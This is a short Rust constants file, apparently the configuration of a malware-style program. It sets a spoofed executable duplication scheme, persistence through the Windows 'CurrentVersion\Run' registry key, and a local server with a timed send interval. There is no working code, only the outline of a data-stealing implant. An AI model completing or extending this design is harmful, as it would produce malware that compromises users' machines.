pub const DUPLICATED_EXECUTABLE_PADDING: &[u8] = b"gdn56ds9sdde5d0w";

// Network constants
pub const SERVER_HOST: &str = "127.0.0.1";
pub const SERVER_PORT: u16 = 8080;
pub const SEND_INTERVAL_SECS: u64 = 5;

// Constants related to the duplication process
pub const SPOOFED_EXECUTABLE_LENGTH: usize = 20;

// Persistence-related constants
pub const REGISTRY_PATH: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
